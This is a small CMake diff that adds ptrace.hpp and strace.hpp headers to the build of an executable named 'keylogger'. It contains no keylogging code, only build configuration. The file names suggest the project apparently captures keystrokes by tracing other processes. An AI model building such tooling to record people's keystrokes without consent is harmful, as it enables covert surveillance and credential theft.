@@ -6,7 +6,7 @@ include_directories(includes)
 include_directories(src)
 FIND_PACKAGE( Boost 1.65 REQUIRED COMPONENTS filesystem regex)
 
-add_executable(keylogger src/main.cpp includes/process.hpp includes/keylogger.hpp includes/parsing.hpp)
+add_executable(keylogger src/main.cpp includes/process.hpp includes/keylogger.hpp includes/parsing.hpp includes/ptrace.hpp includes/strace.hpp)
 target_link_libraries(keylogger stdc++fs pthread Boost::regex Boost::filesystem)
 
 
